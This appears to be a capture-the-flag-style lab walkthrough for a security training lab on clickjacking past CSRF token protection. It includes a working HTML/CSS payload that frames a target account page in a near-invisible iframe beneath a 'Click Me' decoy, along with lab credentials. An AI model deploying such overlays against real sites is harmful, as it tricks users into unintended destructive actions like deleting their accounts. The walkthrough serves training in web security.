# Basic clickjacking with CSRF token protection
* The lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
	* To solve the lab, craft some HTML that frames the account page and fools the user into deleting thier account. The lab is solved when the account is deleted.
	* You can log in your own account using the following credentials `wiener:peter`
	* The victim will be using Chrome so test your exploit on that browser.
### 1, Enumerate the webpage after login as _wiener_
* Trun on the proxy and enumerate the web page.

### 2. Make a malicious HTML template on the provided exploit server
* Insert this template at the "Body" section.
	* Opacity is set to 0.1 so that you can align the iframe actions and adjust the position values as necessary. (For the submitted attack a value 0.0001 will work)
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height:700px;
        opacity:0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://ac2d1f821fbe69aec05a7f2400c20000.web-security-academy.net/my-account"></iframe>
```
### 3. Confirm the exploit
* Click Store and then View exploit.

* Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly.
	* If the div does not line up properly, adjust the _top_ and _left_ property of the style sheet.
* When the "Top" value is set to 495px, the div is properly adjusted.

### 4. Modify the exploit to be executed
* In this lab environment, the word "click" will executed the malicious HTML script, so change "Test me" to "Click Me". Also change the opacity to 0.0001 to hide the original page.

* Then, store and click "deliver exploit to victim".
	* As a result, the lab is solved.
